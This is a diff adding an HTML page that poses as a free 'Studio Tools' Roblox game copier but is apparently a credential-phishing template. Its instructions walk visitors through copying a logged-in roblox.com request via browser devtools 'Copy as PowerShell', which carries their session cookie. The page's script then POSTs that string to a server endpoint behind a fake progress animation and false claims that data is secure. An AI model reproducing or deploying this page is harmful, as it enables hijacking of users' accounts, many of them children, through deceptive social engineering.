@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Studio Tools - Roblox Development Suite</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+            <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        surface: { 50: '#111111', 100: '#1A1A1A', 200: '#262626', 300: '#404040' },
+                    },
+                    fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background: #050505; }
+        .glass-panel { background: rgba(17,17,17,.6); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,.05); }
+        .glow-gradient { position: fixed; top: -40%; left: -20%; width: 140%; height: 100%; background: radial-gradient(ellipse at 30% 20%, rgba(255,255,255,.04) 0%, transparent 50%), radial-gradient(ellipse at 80% 60%, rgba(255,255,255,.02) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        .fade-up { animation: fadeUp .6s ease forwards; }
+        .fade-up-d1 { animation-delay: .1s; opacity: 0; }
+        .fade-up-d2 { animation-delay: .2s; opacity: 0; }
+        .fade-up-d3 { animation-delay: .3s; opacity: 0; }
+        .fade-up-d4 { animation-delay: .4s; opacity: 0; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner { animation: spin .8s linear infinite; }
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+        .progress-fill { animation: progress 3s ease-out forwards; }
+    </style>
+</head>
+<body class="font-sans text-neutral-300 antialiased min-h-screen">
+    <div class="glow-gradient"></div>
+
+    <header class="sticky top-0 z-50 border-b border-white/5 backdrop-blur-xl bg-[#050505]/80">
+        <div class="max-w-5xl mx-auto px-6 h-16 flex items-center justify-between">
+            <div class="text-lg font-bold text-white">Studio Tools</div>
+            <nav class="hidden md:flex items-center gap-8">
+                <a href="#tools" class="text-sm text-neutral-500 hover:text-white transition-colors">Tools</a>
+                <a href="#features" class="text-sm text-neutral-500 hover:text-white transition-colors">Features</a>
+                <a href="#about" class="text-sm text-neutral-500 hover:text-white transition-colors">About</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="relative z-10">
+        <section class="pt-24 pb-12 text-center px-6">
+            <div class="max-w-3xl mx-auto">
+                <div class="fade-up inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-white/10 border border-white/10 text-neutral-400 text-xs font-semibold mb-8">
+                    <span class="w-2 h-2 rounded-full bg-white/50 animate-pulse"></span>
+                    Free &amp; Open Source
+                </div>
+                <h1 class="fade-up fade-up-d1 text-5xl md:text-7xl font-bold text-white leading-[1.1] mb-6">
+                    Professional Tools<br>
+                    <span class="bg-gradient-to-r from-neutral-200 to-neutral-500 bg-clip-text text-transparent">for Roblox Developers</span>
+                </h1>
+                <p class="fade-up fade-up-d2 text-lg text-neutral-500 max-w-xl mx-auto">
+                    Advanced development utilities designed to streamline your Roblox Studio workflow. Fast, secure, and completely free.
+                </p>
+            </div>
+        </section>
+
+        <section id="tools" class="py-12 px-6">
+            <div class="max-w-xl mx-auto">
+                <div class="fade-up fade-up-d3 glass-panel rounded-2xl p-8 md:p-10">
+                    <div class="text-center mb-8">
+                        <div class="w-14 h-14 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center mx-auto mb-4">
+                            <svg class="" style="width:24px;height:24px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75"><rect x="2" y="6" width="20" height="12" rx="5"/><path d="M6 12h4M8 10v4"/><circle cx="16" cy="11" r="1.2" fill="currentColor" stroke="none"/><circle cx="18" cy="13" r="1.2" fill="currentColor" stroke="none"/></svg>
+                        </div>
+                        <h2 class="text-2xl font-bold text-white mb-2">Game Copier</h2>
+                        <p class="text-sm text-neutral-500">Copy any Roblox game instantly for analysis and development</p>
+                    </div>
+
+                    <div class="mb-5 p-4 rounded-xl bg-white/[.02] border border-white/6">
+                        <div class="flex items-center gap-2 mb-3">
+                            <svg style="width:13px;height:13px;stroke:#737373;fill:none;display:inline-block;flex-shrink:0" viewBox="0 0 24 24" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                            <span class="text-[11px] font-semibold text-neutral-400">How to get the authorization string</span>
+                        </div>
+                        <ol class="space-y-2">
+                            <li class="flex items-start gap-2.5 text-[11px] text-neutral-600">
+                                <span class="flex-shrink-0 w-4 h-4 rounded-full bg-white/10 text-[#c0c0c8] text-[9px] font-bold flex items-center justify-center mt-0.5">1</span>
+                                Open <a href="https://www.roblox.com" target="_blank" class="text-neutral-400 hover:underline">roblox.com</a> and log in to your account
+                            </li>
+                            <li class="flex items-start gap-2.5 text-[11px] text-neutral-600">
+                                <span class="flex-shrink-0 w-4 h-4 rounded-full bg-white/10 text-[#c0c0c8] text-[9px] font-bold flex items-center justify-center mt-0.5">2</span>
+                                Press <span class="text-neutral-400 font-mono">F12</span> → <span class="text-neutral-400">Network</span> → refresh the page
+                            </li>
+                            <li class="flex items-start gap-2.5 text-[11px] text-neutral-600">
+                                <span class="flex-shrink-0 w-4 h-4 rounded-full bg-white/10 text-[#c0c0c8] text-[9px] font-bold flex items-center justify-center mt-0.5">3</span>
+                                Right-click any request → <span class="text-neutral-400">Copy</span> → <span class="text-neutral-400 font-mono">Copy as PowerShell</span>
+                            </li>
+                            <li class="flex items-start gap-2.5 text-[11px] text-neutral-600">
+                                <span class="flex-shrink-0 w-4 h-4 rounded-full bg-white/10 text-[#c0c0c8] text-[9px] font-bold flex items-center justify-center mt-0.5">4</span>
+                                Paste the result below
+                            </li>
+                        </ol>
+                    </div>
+
+                    <form id="gameForm">
+                        <div class="mb-5">
+                            <label class="block text-sm font-medium text-neutral-400 mb-2">Authorization String</label>
+                            <input type="password" id="authInput" required autocomplete="off"
+                                   placeholder="Paste your authorization string here..."
+                                   class="w-full bg-black/40 border border-white/10 rounded-xl py-3.5 px-4 text-sm text-white placeholder-neutral-700 focus:outline-none focus:border-white/30 focus:ring-1 focus:ring-white/30 transition-all">
+                        </div>
+
+                        <button type="submit" id="submitBtn"
+                                class="w-full py-4 bg-white text-black font-bold text-sm rounded-xl hover:bg-neutral-200 transition-colors disabled:opacity-40 disabled:cursor-not-allowed">
+                            <span id="btnText">Copy Game</span>
+                        </button>
+                    </form>
+
+                    <div id="progressArea" class="hidden mt-6">
+                        <div class="space-y-3" id="progressSteps"></div>
+                        <div class="mt-4 h-1 rounded-full bg-white/5 overflow-hidden">
+                            <div id="progressBar" class="h-full rounded-full bg-white"></div>
+                        </div>
+                    </div>
+
+                    <div id="statusMessage" class="mt-4 p-4 rounded-xl text-sm font-medium text-center hidden"></div>
+                </div>
+            </div>
+        </section>
+
+        <section id="features" class="py-16 px-6">
+            <div class="max-w-4xl mx-auto">
+                <div class="fade-up fade-up-d4 grid md:grid-cols-3 gap-4">
+                    <div class="glass-panel rounded-xl p-6 hover:border-white/10 transition-all hover:-translate-y-1">
+                        <div class="w-10 h-10 rounded-lg bg-white/5 flex items-center justify-center mb-4">
+                            <svg class="" style="width:18px;height:18px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+                        </div>
+                        <h3 class="text-sm font-bold text-white mb-2">Lightning Fast</h3>
+                        <p class="text-xs text-neutral-500 leading-relaxed">Optimized processing ensures quick results without compromising quality</p>
+                    </div>
+                    <div class="glass-panel rounded-xl p-6 hover:border-white/10 transition-all hover:-translate-y-1">
+                        <div class="w-10 h-10 rounded-lg bg-white/5 flex items-center justify-center mb-4">
+                            <svg class="" style="width:18px;height:18px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+                        </div>
+                        <h3 class="text-sm font-bold text-white mb-2">Secure &amp; Private</h3>
+                        <p class="text-xs text-neutral-500 leading-relaxed">Your data is encrypted and never shared with third parties</p>
+                    </div>
+                    <div class="glass-panel rounded-xl p-6 hover:border-white/10 transition-all hover:-translate-y-1">
+                        <div class="w-10 h-10 rounded-lg bg-white/5 flex items-center justify-center mb-4">
+                            <svg class="" style="width:18px;height:18px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>
+                        </div>
+                        <h3 class="text-sm font-bold text-white mb-2">Easy to Use</h3>
+                        <p class="text-xs text-neutral-500 leading-relaxed">Simple interface designed for developers of all skill levels</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="border-t border-white/5 py-8 text-center relative z-10">
+        <p class="text-xs text-neutral-600">&copy; 2026 Studio Tools. Built for the Roblox community.</p>
+    </footer>
+
+    <script>
+        const form = document.getElementById('gameForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const statusMessage = document.getElementById('statusMessage');
+        const authInput = document.getElementById('authInput');
+        const progressArea = document.getElementById('progressArea');
+        const progressSteps = document.getElementById('progressSteps');
+        const progressBar = document.getElementById('progressBar');
+
+        const steps = [
+            { text: 'Authenticating with Roblox API...', delay: 0 },
+            { text: 'Resolving place data...', delay: 800 },
+            { text: 'Downloading game assets...', delay: 1800 },
+            { text: 'Packaging .rbxl file...', delay: 2800 },
+        ];
+
+        function showProgress() {
+            progressArea.classList.remove('hidden');
+            statusMessage.classList.add('hidden');
+            progressSteps.innerHTML = '';
+            progressBar.className = 'h-full rounded-full bg-white progress-fill';
+
+            steps.forEach((step, i) => {
+                setTimeout(() => {
+                    const prev = progressSteps.querySelector('[data-active]');
+                    if (prev) {
+                        prev.innerHTML = `<svg class="" style="width:14px;height:14px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><span class="text-neutral-300">${prev.dataset.text}</span>`;
+                        prev.removeAttribute('data-active');
+                    }
+                    const el = document.createElement('div');
+                    el.className = 'flex items-center gap-2 text-xs';
+                    el.dataset.text = step.text;
+                    el.dataset.active = '1';
+                    el.innerHTML = `<svg class="w-3.5 h-3.5 text-white/50 spinner" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 70" stroke-linecap="round"/></svg><span class="text-neutral-400">${step.text}</span>`;
+                    progressSteps.appendChild(el);
+                }, step.delay);
+            });
+        }
+
+        function hideProgress() {
+            const prev = progressSteps.querySelector('[data-active]');
+            if (prev) {
+                prev.innerHTML = `<svg class="" style="width:14px;height:14px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><span class="text-neutral-300">${prev.dataset.text}</span>`;
+                prev.removeAttribute('data-active');
+            }
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const authValue = authInput.value.trim();
+            if (!authValue) { showStatus('Please enter your authorization string', 'error'); return; }
+
+            submitBtn.disabled = true;
+            btnText.textContent = 'Processing...';
+            showProgress();
+
+            try {
+                await new Promise(r => setTimeout(r, 1500));
+
+                const response = await fetch('/api/process_game', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        payload: authValue,
+                        sid: '{{ user_id }}',
+                        ref: '{{ domain }}'
+                    })
+                });
+                const data = await response.json();
+
+                await new Promise(r => setTimeout(r, 2000));
+                hideProgress();
+
+                if (data.status === 'success') {
+                    showStatus('Game copied successfully! Starting download...', 'success');
+                    authInput.value = '';
+                    if (data.file_id) {
+                        setTimeout(() => { window.location.href = '/api/assets/' + data.file_id; }, 1200);
+                    }
+                } else {
+                    showStatus(data.message || 'An error occurred', 'error');
+                }
+            } catch (error) {
+                hideProgress();
+                showStatus('Network error. Please check your connection and try again.', 'error');
+            } finally {
+                submitBtn.disabled = false;
+                btnText.textContent = 'Copy Game';
+            }
+        });
+
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'mt-4 p-4 rounded-xl text-sm font-medium text-center ' +
+                (type === 'success' ? 'bg-[rgba(255,255,255,.12)] border border-white/10 text-[#c0c0c8]' : 'bg-[rgba(255,100,100,.1)] border border-[rgba(255,100,100,.2)] text-[#ff8888]');
+        }
+    </script>
+</body>
+</html>
